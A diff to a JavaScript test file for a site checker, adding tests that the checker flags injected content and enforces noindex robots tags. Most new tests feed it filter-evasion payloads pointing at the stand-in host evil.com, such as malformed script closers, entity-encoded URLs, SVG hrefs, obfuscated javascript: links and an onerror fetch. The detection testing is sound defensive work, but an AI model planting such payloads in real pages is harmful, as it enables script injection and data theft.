@@ -142,3 +142,68 @@ test("the command prints ok for a clean site and exits 1 with the problems other
   assert.equal(bad.status, 1);
   assert.match(bad.stdout + bad.stderr, /FAQ/i);
 });
+
+// ---- fix round 1: forms of HTML and CSS that browsers accept -----------------
+
+const into = (rel, html) => change(rel, (t) => t.replace("</body>", `${html}</body>`));
+const E = "//evil.com/x.js";
+const EVIL = /evil\.com/;
+const flagged = (name, rel, html, re = EVIL) =>
+  test(`flagged: ${name}`, () => has(checkSite(copy(into(rel, html))), re));
+
+flagged("comment ended by <!-->", "faq.html", `<!--> <script src="${E}"></script> <!-- -->`, /new script/);
+flagged("comment ended by --!>", "faq.html", `<!-- a --!> <script src="${E}"></script> <!-- -->`, /new script/);
+flagged("script closed by </script x>", "faq.html", `<script src="${E}"></script x>`, /new script/);
+flagged("script closed by </script/>", "faq.html", `<script src="${E}"></script/>`, /new script/);
+flagged("style closed by </style x>", "faq.html", `<style>@import "//evil.com/a.css";</style x>`);
+flagged("button formaction", "faq.html", `<button formaction="//evil.com/p">x</button>`);
+flagged("a ping", "faq.html", `<a href="/details" ping="//evil.com/p">x</a>`);
+flagged("svg image href", "faq.html", `<svg><image href="//evil.com/a"></image></svg>`);
+flagged("svg image xlink:href", "faq.html", `<svg><image xlink:href="//evil.com/a"></image></svg>`);
+flagged("link imagesrcset", "faq.html", `<link rel="preload" as="image" imagesrcset="//evil.com/a 1x">`);
+flagged("entity-encoded poster", "faq.html", `<video poster="&#47;&#47;evil.com/p"></video>`);
+flagged("entity-encoded style url", "faq.html", `<p style="background:url(&#47;/evil.com/a)">x</p>`);
+flagged("backslash poster", "faq.html", `<video poster="\\\\evil.com/p"></video>`);
+flagged("slash-backslash audio src", "faq.html", `<audio src="/\\evil.com/a"></audio>`);
+flagged("tab inside a protocol-relative src", "faq.html", `<img src="/&#9;/evil.com/a" alt="">`);
+flagged("data attribute holding a url", "faq.html", `<div data-x="https://evil.com/f"></div>`);
+flagged("template content", "faq.html", `<template><script src="${E}"></script></template>`, /new script/);
+flagged("noscript content", "faq.html", `<noscript><img src="//evil.com/p" alt=""></noscript>`);
+flagged("style block image-set", "faq.html", `<style>p{background:image-set("//evil.com/a.png" 1x)}</style>`);
+flagged("handler reused with new code", "details.html", `<img src="" onerror="fetch('//evil.com')" alt="">`, /onerror/);
+flagged("javascript: href with entity", "faq.html", `<a href="&#106;avascript:alert(1)">x</a>`, /javascript:/);
+flagged("javascript: href with tab", "faq.html", `<a href="java&#9;script:alert(1)">x</a>`, /javascript:/);
+flagged("javascript: href with leading space and control character", "faq.html", `<a href=" &#1;javascript:alert(1)">x</a>`, /javascript:/);
+flagged("data: href", "faq.html", `<a href="data:text/html,x">x</a>`, /data:/);
+
+test("flagged: CSS image-set and escaped url in the stylesheet", () => {
+  has(checkSite(copy(change("css/styles.css", (t) => t + '\np{background:image-set("//evil.com/a.png" 1x)}\n'))), EVIL);
+  has(checkSite(copy(change("css/styles.css", (t) => t + '\np{background:url("\\2f\\2f evil.com/a.png")}\n'))), EVIL);
+  has(checkSite(copy(change("css/styles.css", (t) => t + '\n@import "https://evil.com/a.css";\n'))), EVIL);
+});
+
+test("a new stylesheet linked from a page is scanned too", () => {
+  const site = copy((d) => {
+    fs.writeFileSync(path.join(d, "css/extra.css"), "p{background:url(//evil.com/a.png)}");
+    change("faq.html", (t) => t.replace("</head>", '<link rel="stylesheet" href="css/extra.css"></head>'))(d);
+  });
+  has(checkSite(site), EVIL);
+});
+
+test("a commented-out noindex does not count", () => {
+  has(checkSite(copy(change("study/index.html", (t) =>
+    t.replace(/<meta name="robots"[^>]*>/, '<!-- <meta name="robots" content="noindex"> --><meta name="robots" content="index">')))), /study\/index\.html.*noindex/);
+});
+
+test("every robots meta must say noindex", () => {
+  has(checkSite(copy(change("study/index.html", (t) => t.replace("</head>", '<meta name="robots" content="index"></head>')))), /study\/index\.html.*noindex/);
+});
+
+test("content changes with a new hotel link and a new image are fine", () => {
+  const site = copy((d) => {
+    fs.copyFileSync(path.join(d, "favicon.ico"), path.join(d, "images/brand-new.ico"));
+    change("travel.html", (t) => t.replace("</body>",
+      '<p>New words.</p><a href="https://example-hotel.com">Hotel</a><img src="images/brand-new.ico" alt="x"></body>'))(d);
+  });
+  assert.deepEqual(checkSite(site), []);
+});
